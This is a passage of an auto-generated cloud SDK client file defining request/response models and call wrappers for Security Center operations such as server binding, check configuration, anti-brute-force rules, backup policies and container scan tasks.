*   **0**: The servers are bound to or unbound from Security Center.
*   **1**: The values that you specified for the parameters are invalid.
*   **2**: The quota for servers that can be protected is insufficient.
*   **3**: The quota for cores of servers that can be protected is insufficient.', example='[{"name":"riskStatus","value":"YES"},{"name":"internetIp","value":"1.2.XX.XX"}]'),
  logicalExp?: string(name='LogicalExp', description='The search conditions that are used to filter servers. The value of this parameter is in the JSON format and is case-sensitive.

>  A search condition can be an instance ID, instance name, virtual private cloud (VPC) ID, region, or public IP address. You can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported search conditions.', example='OR'),
  unBind?: [ string ](name='UnBind', description='Binds servers to Security Center or unbinds servers from Security Center.'),
}

model BindAuthToMachineResponseBody = {
  bindCount?: int32(name='BindCount', example='1'),
  insufficientCoreCount?: int32(name='InsufficientCoreCount', example='1'),
  insufficientEcsCount?: int32(name='InsufficientEcsCount', example='1'),
  requestId?: string(name='RequestId', example='23AD0BD2-8771-5647-819E-6BA51E212F80'),
  resultCode?: int32(name='ResultCode', example='2'),
  unBindCount?: int32(name='UnBindCount', example='1'),
}

model BindAuthToMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: BindAuthToMachineResponseBody(name='body'),
}

async function bindAuthToMachineWithOptions(request: BindAuthToMachineRequest, runtime: Util.RuntimeOptions): BindAuthToMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.authVersion)) {
    query['AuthVersion'] = request.authVersion;
  }
  if (!Util.isUnset(request.autoBind)) {
    query['AutoBind'] = request.autoBind;
  }
  if (!Util.isUnset(request.bind)) {
    query['Bind'] = request.bind;
  }
  if (!Util.isUnset(request.bindAll)) {
    query['BindAll'] = request.bindAll;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.unBind)) {
    query['UnBind'] = request.unBind;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'BindAuthToMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function bindAuthToMachine(request: BindAuthToMachineRequest): BindAuthToMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return bindAuthToMachineWithOptions(request, runtime);
}

model CancelOnceTaskRequest {
  taskId?: string(name='TaskId', example='ec9c0d88f36cc27765a98c554ee2****'),
}

model CancelOnceTaskResponseBody = {
  requestId?: string(name='RequestId', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
}

model CancelOnceTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CancelOnceTaskResponseBody(name='body'),
}

async function cancelOnceTaskWithOptions(request: CancelOnceTaskRequest, runtime: Util.RuntimeOptions): CancelOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CancelOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function cancelOnceTask(request: CancelOnceTaskRequest): CancelOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return cancelOnceTaskWithOptions(request, runtime);
}

model ChangeCheckConfigRequest {
  endTime?: int32(name='EndTime', description='The end time of the check. The value specifies a point in time in a day. The time period that is specified by the start time and end time must be one of the following time periods:

*   **00:00 to 06:00:** If you set the StartTime parameter to 0, you must set the EndTime parameter to 6.
*   **06:00 to 12:00**: If you set the StartTime parameter to 6, you must set the EndTime parameter to 12.
*   **12:00 to 18:00**: If you set the StartTime parameter to 12, you must set the EndTime parameter to 18.
*  **18:00 to 24:00:** If you set the StartTime parameter to 18, you must set the EndTime parameter to 24.', example='6'),
  regionId?: string(name='RegionId', description='The region ID of the bastion host to query.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='cn-hangzhou'),
  standardIds?: [ long ](name='StandardIds', description='An array that consists of the information about the check item.'),
  startTime?: int32(name='StartTime', description='The start time of the check. The value specifies a point in time in a day.', example='0'),
}

model ChangeCheckConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6EBB8614-746D-555D-AB69-C801AEC7DCE0'),
}

model ChangeCheckConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ChangeCheckConfigResponseBody(name='body'),
}

async function changeCheckConfigWithOptions(request: ChangeCheckConfigRequest, runtime: Util.RuntimeOptions): ChangeCheckConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.standardIds)) {
    query['StandardIds'] = request.standardIds;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ChangeCheckConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function changeCheckConfig(request: ChangeCheckConfigRequest): ChangeCheckConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return changeCheckConfigWithOptions(request, runtime);
}

model ChangeCheckCustomConfigRequest {
  checkId?: long(name='CheckId', example='76'),
  customConfigs?: [ 
    {
      name?: string(name='Name', example='SessionTimeMax'),
      operation?: string(name='Operation', example='DELETE'),
      value?: string(name='Value', example='13'),
    }
  ](name='CustomConfigs'),
  regionId?: string(name='RegionId', example='cn-hangzhou'),
}

model ChangeCheckCustomConfigResponseBody = {
  illegalCustomConfigs?: [ 
    {
      name?: string(name='Name', example='SessionTimeMax'),
    }
  ](name='IllegalCustomConfigs'),
  requestId?: string(name='RequestId', example='DA8133CC-CCA0-5CF2-BF64-FE7D52C44***'),
}

model ChangeCheckCustomConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ChangeCheckCustomConfigResponseBody(name='body'),
}

async function changeCheckCustomConfigWithOptions(request: ChangeCheckCustomConfigRequest, runtime: Util.RuntimeOptions): ChangeCheckCustomConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.customConfigs)) {
    query['CustomConfigs'] = request.customConfigs;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ChangeCheckCustomConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function changeCheckCustomConfig(request: ChangeCheckCustomConfigRequest): ChangeCheckCustomConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return changeCheckCustomConfigWithOptions(request, runtime);
}

model CheckQuaraFileIdRequest {
  quaraFileIds?: [ string ](name='QuaraFileIds'),
  uuid?: string(name='Uuid', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
}

model CheckQuaraFileIdResponseBody = {
  data?: boolean(name='Data', example='true'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model CheckQuaraFileIdResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CheckQuaraFileIdResponseBody(name='body'),
}

async function checkQuaraFileIdWithOptions(request: CheckQuaraFileIdRequest, runtime: Util.RuntimeOptions): CheckQuaraFileIdResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.quaraFileIds)) {
    query['QuaraFileIds'] = request.quaraFileIds;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CheckQuaraFileId',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function checkQuaraFileId(request: CheckQuaraFileIdRequest): CheckQuaraFileIdResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkQuaraFileIdWithOptions(request, runtime);
}

model CheckSecurityEventIdRequest {
  securityEventIds?: [ string ](name='SecurityEventIds', description='The IDs of alert events. You can specify up to 100 IDs. If you do not specify this parameter, the value of the response parameter **Data** is **false**. The value false indicates that no alert events are generated on the server.

> You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the IDs of alert events.', example='["1234567","98765432"]'),
  uuid?: string(name='Uuid', description='The UUID of the server.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='96ad2473-bc60-45ba-ad1c-932e2866****'),
}

model CheckSecurityEventIdResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the alert events are generated on the server. Valid values:

*   **true**
*   **false**: no', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1383B0DB-D5D6-4B0C-9E6B-75939C8E67FE'),
}

model CheckSecurityEventIdResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CheckSecurityEventIdResponseBody(name='body'),
}

async function checkSecurityEventIdWithOptions(request: CheckSecurityEventIdRequest, runtime: Util.RuntimeOptions): CheckSecurityEventIdResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CheckSecurityEventId',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function checkSecurityEventId(request: CheckSecurityEventIdRequest): CheckSecurityEventIdResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkSecurityEventIdWithOptions(request, runtime);
}

model CheckUserHasEcsRequest {
  lang?: string(name='Lang', description='CheckUserHasEcs', example='zh'),
}

model CheckUserHasEcsResponseBody = {
  code?: string(name='Code', example='200'),
  data?: boolean(name='Data', example='true'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  success?: boolean(name='Success', example='true'),
}

model CheckUserHasEcsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CheckUserHasEcsResponseBody(name='body'),
}

async function checkUserHasEcsWithOptions(request: CheckUserHasEcsRequest, runtime: Util.RuntimeOptions): CheckUserHasEcsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CheckUserHasEcs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function checkUserHasEcs(request: CheckUserHasEcsRequest): CheckUserHasEcsResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkUserHasEcsWithOptions(request, runtime);
}

model ConfirmVirusEventsRequest {
  operationAll?: int32(name='OperationAll', description='Confirms the alert events that you want to handle.', example='0'),
  operationCode?: string(name='OperationCode', description='The ID of the request.', example='default'),
  operationRange?: string(name='OperationRange', description='The server on which you want to perform the alert events.', example='[{\\"type\\":\\"machine\\",\\"list\\":[\\"3aedba3d-bd4d-4dfb-bb0d-xxxxxxxxxxxx\\"]}]'),
}

model ConfirmVirusEventsResponseBody = {
  requestId?: string(name='RequestId', example='5DFD6277-CC36-57F7-ACE6-F5952XXXXXXXX'),
  result?: boolean(name='Result', example='true'),
}

model ConfirmVirusEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ConfirmVirusEventsResponseBody(name='body'),
}

async function confirmVirusEventsWithOptions(request: ConfirmVirusEventsRequest, runtime: Util.RuntimeOptions): ConfirmVirusEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.operationAll)) {
    query['OperationAll'] = request.operationAll;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationRange)) {
    query['OperationRange'] = request.operationRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ConfirmVirusEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function confirmVirusEvents(request: ConfirmVirusEventsRequest): ConfirmVirusEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return confirmVirusEventsWithOptions(request, runtime);
}

model CreateAntiBruteForceRuleRequest {
  defaultRule?: boolean(name='DefaultRule', example='true'),
  failCount?: int32(name='FailCount', example='2'),
  forbiddenTime?: int32(name='ForbiddenTime', example='5'),
  name?: string(name='Name', example='TestAntiBruteForceRule'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', example='192.168.XX.XX'),
  span?: int32(name='Span', example='1'),
  uuidList?: [ string ](name='UuidList'),
}

model CreateAntiBruteForceRuleResponseBody = {
  createAntiBruteForceRule?: {
    ruleId?: long(name='RuleId', example='65778'),
  }(name='CreateAntiBruteForceRule'),
  requestId?: string(name='RequestId', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model CreateAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateAntiBruteForceRuleResponseBody(name='body'),
}

async function createAntiBruteForceRuleWithOptions(request: CreateAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): CreateAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defaultRule)) {
    query['DefaultRule'] = request.defaultRule;
  }
  if (!Util.isUnset(request.failCount)) {
    query['FailCount'] = request.failCount;
  }
  if (!Util.isUnset(request.forbiddenTime)) {
    query['ForbiddenTime'] = request.forbiddenTime;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.span)) {
    query['Span'] = request.span;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createAntiBruteForceRule(request: CreateAntiBruteForceRuleRequest): CreateAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return createAntiBruteForceRuleWithOptions(request, runtime);
}

model CreateAssetSelectionConfigRequest {
  businessType?: string(name='BusinessType', example='VIRUS_SCAN_CYCLE_CONFIG'),
  targetType?: string(name='TargetType', example='vpc'),
}

model CreateAssetSelectionConfigResponseBody = {
  data?: {
    businessType?: string(name='BusinessType', example='VIRUS_SCAN_CYCLE_CONFIG'),
    selectionKey?: long(name='SelectionKey', example='53e93435-d694-4c03-9ce7-da12bee1****'),
    targetType?: string(name='TargetType', example='group'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='A3D7C47D-3F11-57BB-90E8-E5C20C619F37'),
}

model CreateAssetSelectionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateAssetSelectionConfigResponseBody(name='body'),
}

async function createAssetSelectionConfigWithOptions(request: CreateAssetSelectionConfigRequest, runtime: Util.RuntimeOptions): CreateAssetSelectionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.businessType)) {
    query['BusinessType'] = request.businessType;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateAssetSelectionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createAssetSelectionConfig(request: CreateAssetSelectionConfigRequest): CreateAssetSelectionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return createAssetSelectionConfigWithOptions(request, runtime);
}

model CreateBackupPolicyRequest {
  name?: string(name='Name', example='ServerBackUpPolicy01'),
  policy?: map[string]any(name='Policy', example='"{"IsDefault":1,"Include":[],"Source":[],"Schedule":"I|1648061040|PT24H","Retention":7,"SpeedLimiter":"","ExcludeSystemPath":true,"Exclude":["/bin/","/usr/bin/","/sbin/","/boot/","/proc/","/sys/","/srv/","/lib/","/selinux/","/usr/sbin/","/run/","/lib32/","/lib64/","/lost+found/","/var/lib/kubelet/","/var/lib/ntp/proc","/var/lib/container","Windows","Python27","Program Files (x86)","Program Files","Boot","$RECYCLE.BIN","System Volume Information","Users\\Administrator\\NTUSER.DAT*","ProgramData","pagefile.sys","Users\\Default\\NTUSER.DAT*","Users\\Administrator\\ntuser.*"],"UseVss":true}"'),
  policyRegionId?: string(name='PolicyRegionId', example='ch-hangzhou'),
  policyVersion?: string(name='PolicyVersion', example='2.0.0'),
  uuidList?: [ string ](name='UuidList', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model CreateBackupPolicyShrinkRequest {
  name?: string(name='Name', example='ServerBackUpPolicy01'),
  policyShrink?: string(name='Policy', example='"{"IsDefault":1,"Include":[],"Source":[],"Schedule":"I|1648061040|PT24H","Retention":7,"SpeedLimiter":"","ExcludeSystemPath":true,"Exclude":["/bin/","/usr/bin/","/sbin/","/boot/","/proc/","/sys/","/srv/","/lib/","/selinux/","/usr/sbin/","/run/","/lib32/","/lib64/","/lost+found/","/var/lib/kubelet/","/var/lib/ntp/proc","/var/lib/container","Windows","Python27","Program Files (x86)","Program Files","Boot","$RECYCLE.BIN","System Volume Information","Users\\Administrator\\NTUSER.DAT*","ProgramData","pagefile.sys","Users\\Default\\NTUSER.DAT*","Users\\Administrator\\ntuser.*"],"UseVss":true}"'),
  policyRegionId?: string(name='PolicyRegionId', example='ch-hangzhou'),
  policyVersion?: string(name='PolicyVersion', example='2.0.0'),
  uuidList?: [ string ](name='UuidList', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model CreateBackupPolicyResponseBody = {
  backupPolicy?: {
    id?: string(name='Id', example='1301575'),
    status?: string(name='Status', example='enabled'),
  }(name='BackupPolicy'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model CreateBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateBackupPolicyResponseBody(name='body'),
}

async function createBackupPolicyWithOptions(tmpReq: CreateBackupPolicyRequest, runtime: Util.RuntimeOptions): CreateBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new CreateBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.policy)) {
    request.policyShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.policy, 'Policy', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.policyShrink)) {
    query['Policy'] = request.policyShrink;
  }
  if (!Util.isUnset(request.policyRegionId)) {
    query['PolicyRegionId'] = request.policyRegionId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createBackupPolicy(request: CreateBackupPolicyRequest): CreateBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return createBackupPolicyWithOptions(request, runtime);
}

model CreateContainerScanTaskRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

> You can call the [DescribeGroupedContainerInstances](~~182997~~) operation to query the IDs of clusters.', example='c22143730ab6e40b09ec7c1c51d4d****'),
  containerIds?: string(name='ContainerIds', description='The ID of the container.', example='c927cf190e886696db53cda0efb57145394ccf0bf9f525353fa5c22a26e4****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model CreateContainerScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', description='Indicates whether you can create more scan tasks.', example='true'),
    collectTime?: long(name='CollectTime', description='The collection time.', example='1644286364150'),
    execTime?: long(name='ExecTime', description='The execution time of the task.', example='1644286364150'),
    finishCount?: int32(name='FinishCount', description='The number of scan tasks that are complete.', example='33'),
    progress?: int32(name='Progress', description='The progress of the task.', example='100'),
    result?: string(name='Result', description='The execution result of the task.', example='SUCCESS'),
    status?: string(name='Status', description='The status of the task.', example='SUCCESS'),
    taskId?: string(name='TaskId', description='The ID of the task.', example='fc98d58eb56f699d49bf7ebbd6d7****'),
    totalCount?: int32(name='TotalCount', description='The total number of scan tasks.', example='62'),
  }(name='Data', description='The data returned.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9F4E6157-9600-5588-86B9-38F09067****'),
}

model CreateContainerScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateContainerScanTaskResponseBody(name='body'),
}

async function createContainerScanTaskWithOptions(request: CreateContainerScanTaskRequest, runtime: Util.RuntimeOptions): CreateContainerScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerIds)) {
    query['ContainerIds'] = request.containerIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateContainerScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createContainerScanTask(request: CreateContainerScanTaskRequest): CreateContainerScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createContainerScanTaskWithOptions(request, runtime);
}

model CreateCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp', example='192.168.xx.xx'),
  bound?: string(name='Bound', example='in'),
  expireTime?: long(name='ExpireTime', example='1859094550000'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuids?: string(name='Uuids', example='71c846d6-5c84-4714-acfc-58265bc3****,5013b5e8-1613-43a8-b4de-651db318****,df53f0ad-b3ba-4fe0-9ec7-f42a2ae2****'),
}

model CreateCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', example='30CBF632-109F-596F-97F2-451C8B2A****'),
}

model CreateCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateCustomBlockRecordResponseBody(name='body'),
}

async function createCustomBlockRecordWithOptions(request: CreateCustomBlockRecordRequest, runtime: Util.RuntimeOptions): CreateCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.expireTime)) {
    query['ExpireTime'] = request.expireTime;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createCustomBlockRecord(request: CreateCustomBlockRecordRequest): CreateCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return createCustomBlockRecordWithOptions(request, runtime);
}

model CreateCycleTaskRequest {
  enable?: int32(name='Enable', example='1'),
  firstDateStr?: long(name='FirstDateStr', example='1650556800000'),
  intervalPeriod?: int32(name='IntervalPeriod', example='7'),
  param?: string(name='Param', example='{
      "targetInfo": [
            {
                  "type": "groupId",
                  "name": "TI HOST",
                  "target": 10597***
            },
            {
                  "type": "groupId",
                  "name": "expense HOST",
                  "target": 10597***
            }
      ]
}'),
  periodUnit?: string(name='PeriodUnit', example='day'),
  source?: string(name='Source', example='console_batch'),
  targetEndTime?: int32(name='TargetEndTime', example='6'),
  targetStartTime?: int32(name='TargetStartTime', example='0'),
  taskName?: string(name='TaskName', example='EMG_VUL_SCHEDULE_SCAN'),
  taskType?: string(name='TaskType', example='VIRUS_VUL_SCHEDULE_SCAN'),
}

model CreateCycleTaskResponseBody = {
  requestId?: string(name='RequestId', example='86CFF42E-E00A-57A3-8656-22291EFB****'),
}

model CreateCycleTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateCycleTaskResponseBody(name='body'),
}

async function createCycleTaskWithOptions(request: CreateCycleTaskRequest, runtime: Util.RuntimeOptions): CreateCycleTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.enable)) {
    query['Enable'] = request.enable;
  }
  if (!Util.isUnset(request.firstDateStr)) {
    query['FirstDateStr'] = request.firstDateStr;
  }
  if (!Util.isUnset(request.intervalPeriod)) {
    query['IntervalPeriod'] = request.intervalPeriod;
  }
  if (!Util.isUnset(request.param)) {
    query['Param'] = request.param;
  }
  if (!Util.isUnset(request.periodUnit)) {
    query['PeriodUnit'] = request.periodUnit;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.targetEndTime)) {
    query['TargetEndTime'] = request.targetEndTime;
  }
  if (!Util.isUnset(request.targetStartTime)) {
    query['TargetStartTime'] = request.targetStartTime;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateCycleTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createCycleTask(request: CreateCycleTaskRequest): CreateCycleTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createCycleTaskWithOptions(request, runtime);
}

model CreateFileDetectRequest {
  hashKey?: string(name='HashKey', example='0a212417e65c26ff133cfff28f6c****'),
  ossKey?: string(name='OssKey', example='1/2022/06/23/15/41/16559701077444693a0c6-33b2-4cc2-a99f-9f38b8b8****'),
  sourceIp?: string(name='SourceIp', example='115.213.XX.XX'),
  type?: int32(name='Type', example='0'),
}

model CreateFileDetectResponseBody = {
  hashKey?: string(name='HashKey', example='0a212417e65c26ff133cfff28f6c****'),
